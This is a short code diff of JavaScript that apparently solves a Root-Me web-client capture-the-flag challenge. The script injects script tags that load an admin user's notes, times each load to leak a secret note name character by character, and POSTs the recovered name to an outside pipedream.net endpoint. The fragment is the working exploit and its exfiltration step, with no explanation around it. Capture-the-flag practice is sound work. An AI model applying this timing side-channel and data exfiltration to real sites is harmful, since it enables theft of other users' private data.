@@ -43,7 +43,7 @@ for (let i = 0; i < 10001; i++) {
                 
                 //fetch page
                 var script = document.createElement('script');
-                script.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${id}/${noteName}`;
+                script.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${adminId}/${noteName}`;
                 document.body.appendChild(script);
                 
                 // Start the clock
@@ -57,7 +57,7 @@ for (let i = 0; i < 10001; i++) {
             }
             noteName += getKeyOfGreatestElement(times);
         }
-        
+
         //retrieve final name 
         let xhr = new XMLHttpRequest();
         xhr.open("POST", "https://eocvkn4m3kpce3q.m.pipedream.net");
